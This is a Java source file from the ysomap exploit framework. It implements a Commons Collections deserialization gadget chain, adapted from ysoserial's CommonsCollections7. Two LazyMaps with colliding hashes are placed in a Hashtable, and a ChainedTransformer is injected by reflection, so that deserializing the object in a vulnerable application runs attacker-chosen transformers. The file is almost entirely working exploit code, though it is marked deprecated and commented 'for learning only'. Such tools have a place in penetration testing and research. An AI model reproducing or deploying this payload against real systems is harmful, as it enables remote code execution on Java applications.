package ysomap.payloads.java.commons.collection_v3;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.map.LazyMap;
import ysomap.bullets.Bullet;
import ysomap.bullets.collections.TransformerBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.ReflectionHelper;
import ysomap.payloads.AbstractPayload;

import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

/**
 * 仅供学习，实战不建议
 * from ysoserial CommonsCollections7
 * @author wh1t3P1g
 * @since 2020/2/18
 */
@SuppressWarnings({"rawtypes","unchecked"})
//@Payloads
@Deprecated
@Targets({Targets.JDK})
@Require(bullets = {"TransformerBullet",
        "TransformerWithJNDIBullet",
        "TransformerWithSleepBullet",
        "TransformerWithURLClassLoaderBullet",
        "TransformerWithFileWriteBullet"}, param = false)
@Dependencies({"commons-collections:commons-collections:3.2.1"})
@Authors({Authors.SCRISTALLI, Authors.HANYRAX, Authors.EDOARDOVIGNATI})
public class CommonsCollections6 extends AbstractPayload<Hashtable> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof Transformer[];
    }

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        //ObjectGadget bullet = new TransformerWithTemplatesImplBullet(null, "3");
        return TransformerBullet.newInstance(args);
    }

    @Override
    public Hashtable pack(Object obj) throws Exception {
        Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);

        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);

        // Use the colliding Maps as keys in Hashtable
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);

        ReflectionHelper.setFieldValue(transformerChain, "iTransformers", obj);

        // Needed to ensure hash collision after previous manipulations
        lazyMap2.remove("yy");

        return hashtable;
    }


}
